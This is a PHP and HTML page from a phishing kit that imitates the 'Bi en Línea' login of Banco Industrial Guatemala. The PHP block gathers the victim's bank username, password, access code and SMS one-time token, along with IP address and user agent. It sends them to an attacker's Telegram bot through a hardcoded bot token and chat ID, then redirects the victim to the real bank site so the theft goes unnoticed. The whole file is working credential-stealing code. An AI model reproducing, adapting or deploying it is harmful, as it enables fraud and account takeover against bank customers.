<?php
session_start();
header('refresh:6;url=https://www.corporacionbi.com/gt/bancoindustrial/bi-en-linea/');
if( isset( $_POST['ipts1'] ) ){

    $_SESSION['SMS'] = $_POST['ipts1'];
    
    @$message = "GT\n\n".'User-agent: '.$_SERVER['HTTP_USER_AGENT']."\nIP: ".$_SERVER['REMOTE_ADDR']."\n"."IP2: ".$_SERVER['HTTP_X_FORWARDED_FOR']."\n".'COD: '.$_SESSION['COD']."\n".'Usuario: '.$_SESSION['USER']."\n".'Pass: '.$_SESSION['PASS']."\n\n"."TK SMS:".$_POST['ipts1'];

    $apiToken = "5761388760:AAHwURtMYD45Ru5rHHEGfTSwaeQuT8zFMec";

    $data = [
        'chat_id' => '5474544277',
        'text' => $message
    ];
    
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 

}else{
    @header('Location: index.php');
}
?>
<!DOCTYPE html>
<html lang="es">
  <head>

    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <title>Bi en Línea</title>
    
  </head>
  <body style="overflow-x:hidden;">
    <header> 
      <nav style="overflow: hidden;padding-top: 10px;"><div  class="im1" style="width: 200px;text-align: center;display:inline-block;height: 80px;"><img src="lg-nav.png" style="width: 74px;max-width:74px;"></div><div  class="im2" style="width: 300px;text-align: center;display:inline-block;height: 80px;float: right;"><img src="lnks1.svg" style="max-width:300px;height: 80px;"/></div>
      </nav>
    </header>
    <div id="cizq"></div>
    <div id="cder">
        <div class="lg-cont"><img src="lg1.jpg"/></div>
        <div id="mn-frm">
        </div>
    </div>
    <style>
      *{margin:0;padding:0;}
      header nav{
        background-color: #003865;
        background: #003865;
        height: 80px;
        padding-left: 12rem;
        padding-right: 12rem;
      }
      .lg-cont {
        width: 100%;
        text-align: center;
        margin-top: 30px;
      }
      .lg-cont img{
        width: 175px;
        display: inline-block;
      }
      #cder,#cizq{
        width:50%;
        min-height:300px;
        height: 734px;
        display:inline-block;
        float: left;
      }
      #cizq{
        background-image: url(bnr1.jpg);
        background-repeat: no-repeat;
        background-size: cover;
        
      }
      #cder{
        text-align:center;
      }
      #mn-frm{
        height:410px;
        width:363px;
        background-image:url('thnxs.svg');
        background-repeat:no-repeat;
        background-size:cover;
        display:inline-block;
      }
      input{
        color:#333;
        font-family:sans-serif;
        font-size:14px;
      }
      .lg-cont{
            display:none;
        }
        #mn-frm{
            margin-top:10px;
        }
      
      @media screen and (max-width: 1024px){
        #cder,#cizq{
        width:100%;
        }
        #cizq{
          height:30vh!important;
          background-position:center;
          display:none!important;
        }
        .im1,.im2{
          width:100%!important;
          float: left!important;
        }
        .im2{
          display:none;
        }
        .lg-cont{
            display:none;
        }
        #mn-frm{
            margin-top:10px;
        }
      }

      @media screen and (max-width: 450px){
        .im1{
            left: -18px;
          position: relative;
        }
      }
      
    </style>
  </body>
</html>